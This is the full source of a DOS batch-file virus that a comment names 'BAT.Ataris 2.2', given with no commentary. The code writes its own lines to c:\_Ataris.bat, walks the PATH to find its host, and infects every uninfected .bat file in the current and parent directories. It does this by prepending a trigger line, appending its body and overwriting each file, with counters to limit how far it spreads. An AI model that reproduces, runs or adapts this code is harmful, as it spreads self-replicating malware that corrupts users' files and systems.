@if '%_Milan%==' goto _Milan
::**** HOST ****
@if not '%_Milan%==' goto Atarisend
:_Milan Ataris
::Ataris BAT.Ataris 2.2
@echo off%_Ataris%
if '%1=='Ataris goto Ataris%2
set Ataris=%0.bat
if not exist %Ataris% set Ataris=%0
if '%Ataris%==' set Ataris=autoexec.bat
set !Ataris=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %Ataris% Ataris rh
set _Milan=>nul.Ataris
set !Ataris=
if exist c:\_Ataris.bat goto Atarisg
if exist %Ataris% goto Atarisfe
call %Ataris% Ataris h %path%
if exist %Ataris% goto Atarisfe
goto eAtaris
:Atarish
shift%_Ataris%
if '%2==' goto Atarisend
if exist %2\%Ataris set Ataris=%2\%Ataris%
if exist %2%Ataris set Ataris=%2%Ataris%
if exist %2\%Ataris.bat set Ataris=%2\%Ataris%.bat
if exist %2%Ataris.bat set Ataris=%2%Ataris%.bat
if not exist %Ataris% goto Atarish
goto Atarisend
:Atarisfe
find "Ataris"<%Ataris%>c:\_Ataris.bat
:Atarisg
command /e:5000 /c c:\_Ataris Ataris vir
:eAtaris
set Ataris=
goto Atarisend
:Atarisrh
set _Milan=x%_Ataris%
%Ataris% %!Ataris%
:Atarisvir
for %%a in (*.bat ..\*.bat) do call c:\_Ataris Ataris i %%a
exit Ataris
:Atarisi
find "Ataris"<%3>nul
if not errorlevel 1 goto Atarisj
echo @if '%%_Milan%%==' goto _Milan>Ataris$
type %3>>Ataris$
type c:\_Ataris.bat>>Ataris$
move Ataris$ %3>nul
set Ataris#=%Ataris#%1
if %Ataris#%==111 exit
:Atarisj
set Ataris!=%Ataris#%1
if %Ataris!%==111111111111111111111 exit
:Atarisend
